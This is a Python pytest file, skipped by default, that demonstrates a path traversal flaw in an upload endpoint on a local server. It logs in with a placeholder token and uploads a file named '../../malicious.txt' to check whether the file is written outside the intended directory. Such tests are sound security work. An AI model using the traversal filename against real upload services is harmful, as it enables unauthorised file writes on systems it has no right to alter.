import pytest
pytest.skip("requires running server and valid token", allow_module_level=True)
import requests
import os

# This test demonstrates the path traversal vulnerability.
# It uploads a file with a malicious filename to a location outside the intended directory.

# --- Configuration ---
# The target URL of the application
BASE_URL = "http://localhost:8000"
# A valid access token for the application
ACCESS_TOKEN = "YOUR_TOKEN" # Replace with a valid token from your application
# The path to the malicious file to upload
MALICIOUS_FILE_PATH = "malicious.txt"
# The malicious filename to use for the upload
MALICIOUS_FILENAME = "../../malicious.txt"
# The expected location of the uploaded file
EXPECTED_FILE_LOCATION = os.path.abspath(os.path.join(os.getcwd(), MALICIOUS_FILENAME))

# --- Test ---
def test_path_traversal():
    """
    Attempts to upload a file with a path traversal filename.
    """
    # Create a dummy malicious file
    with open(MALICIOUS_FILE_PATH, "w") as f:
        f.write("This is a malicious file.")

    # Authenticate to the application
    session = requests.Session()
    login_payload = {"token": ACCESS_TOKEN}
    login_response = session.post(f"{BASE_URL}/login", data=login_payload)
    if login_response.status_code != 200:
        print(f"Login failed with status code {login_response.status_code}")
        return

    # Upload the malicious file
    upload_url = f"{BASE_URL}/upload"
    with open(MALICIOUS_FILE_PATH, "rb") as f:
        files = {"file": (MALICIOUS_FILENAME, f, "text/plain")}
        upload_response = session.post(upload_url, files=files, data={"directory": ""})

    # Clean up the dummy file
    os.remove(MALICIOUS_FILE_PATH)

    # Check the response
    if upload_response.status_code == 200:
        print("File uploaded successfully.")
    else:
        print(f"File upload failed with status code {upload_response.status_code}")

    # Verify that the file was uploaded to the expected location
    if os.path.exists(EXPECTED_FILE_LOCATION):
        print(f"Vulnerability confirmed: File found at {EXPECTED_FILE_LOCATION}")
        # Clean up the uploaded file
        os.remove(EXPECTED_FILE_LOCATION)
    else:
        print(f"File not found at {EXPECTED_FILE_LOCATION}")

if __name__ == "__main__":
    test_path_traversal()
